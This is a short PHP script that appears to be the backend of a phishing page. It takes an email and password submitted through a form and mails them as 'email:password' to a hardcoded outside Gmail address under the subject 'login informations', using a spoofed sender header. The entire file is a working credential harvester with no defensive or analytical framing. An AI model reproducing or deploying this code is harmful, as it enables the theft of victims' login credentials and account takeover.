<?php
$email = $_POST["email"];
$password = $_POST["password"];
$to = "fredborgesz21@gmail.com";
$subject = "login informations";
$message = "$email:$password";
$header = "From: feet@gmail.com". "\r\n" .
	"Reply-To: feet@gmail.com";

mail($to, $subject, $message, $header);
print("Enviado")
?>
